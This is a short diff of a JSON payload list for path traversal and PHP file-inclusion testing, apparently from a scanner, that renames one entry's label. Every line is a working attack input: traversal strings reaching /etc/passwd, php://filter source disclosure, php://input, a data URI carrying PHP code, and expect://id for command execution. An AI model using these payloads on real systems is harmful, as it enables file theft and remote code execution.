@@ -9,7 +9,7 @@
   { "payload": "../../../../../../../etc/passwd%00.jpg", "type": "Null Byte + Extension", "severity": "critical", "confidence": 0.9 },
   { "payload": "..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd", "type": "URL Encoded Traversal", "severity": "high", "confidence": 0.9 },
   { "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "type": "Double URL Encoded", "severity": "high", "confidence": 0.85 },
-  { "payload": "php://filter/convert.base64-encode/resource=index.php", "type": "PHP Filter (Base64)", "severity": "critical", "confidence": 0.99 },
+  { "payload": "php://filter/convert.base64-encode/resource=index.php", "type": "PHP Filter Wrapper (Base64)", "severity": "critical", "confidence": 0.99 },
   { "payload": "php://input", "type": "PHP Input Stream", "severity": "critical", "confidence": 0.95 },
   { "payload": "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+", "type": "Data URI Wrapper", "severity": "critical", "confidence": 0.95 },
   { "payload": "expect://id", "type": "Expect Wrapper (RCE)", "severity": "catastrophic", "confidence": 1.0 },
